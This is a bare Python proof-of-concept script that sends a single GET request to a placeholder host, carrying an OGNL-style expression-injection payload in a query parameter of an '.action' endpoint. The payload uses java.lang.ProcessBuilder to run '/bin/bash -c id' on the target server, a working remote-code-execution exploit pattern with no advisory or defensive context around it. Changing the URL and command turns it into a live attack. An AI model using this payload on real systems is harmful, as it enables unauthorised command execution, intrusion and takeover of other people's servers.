import requests

url = "https://target.invalid/app/run.action?q=new+java.beans.Statement(new java.beans.Expression(@java.lang.ProcessBuilder@class,'new',new Object[]{new String[]{'/bin/bash','-c','id'}}).getValue(),'start',new Object[0]).execute()"
requests.get(url, timeout=10)
